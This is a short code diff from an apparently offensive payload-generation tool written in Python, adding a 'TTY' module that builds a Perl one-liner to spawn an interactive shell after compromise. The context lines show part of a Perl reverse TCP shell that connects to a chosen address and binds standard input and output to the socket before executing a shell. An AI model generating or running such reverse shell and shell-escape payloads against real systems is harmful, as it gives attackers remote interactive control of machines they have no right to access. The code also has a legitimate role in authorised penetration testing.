@@ -20,3 +20,19 @@ class ReverseTCP(plugin.ReverseShell):
         self.shell += """sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
         self.shell += """exec("{} -i");""".format(self.args.shell)
         self.shell += """};'"""
+
+
+class TTY(plugin.Module):
+    def __init__(self):
+        super().__init__()
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.opts.description = "[TTYShell][TCP] Perl TTY shell escape from https://netsec.ws/?p=337"
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+
+    def make_shell(self):
+        self.shell = """perl -e 'exec "{}"'""".format(self.args.shell)
